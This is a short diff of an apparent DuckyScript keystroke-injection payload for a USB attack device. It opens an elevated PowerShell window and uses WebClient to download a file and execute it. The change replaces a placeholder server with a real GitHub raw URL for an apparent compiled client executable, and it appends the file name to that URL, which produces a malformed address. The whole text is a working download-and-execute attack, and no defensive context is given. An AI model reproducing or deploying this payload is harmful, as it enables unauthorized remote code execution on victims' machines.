@@ -6,5 +6,5 @@ REM my best attempt at a elevated powershell instance
 STRING powershell Start-Process powershell
 ENTER
 DELAY 3000
-STRING $down = New-Object System.Net.WebClient;$file = 'RUN.ps1'; $url = 'http://<SERVER>/'+$file;  $down.DownloadFile($url,$file);powershell .\$file;Exit;
+STRING $down = New-Object System.Net.WebClient;$file = 'RUN.ps1'; $url = 'https://github.com/exem123/downloads/raw/main/Client-built.exe'+$file;  $down.DownloadFile($url,$file);powershell .\$file;Exit;
 ENTER
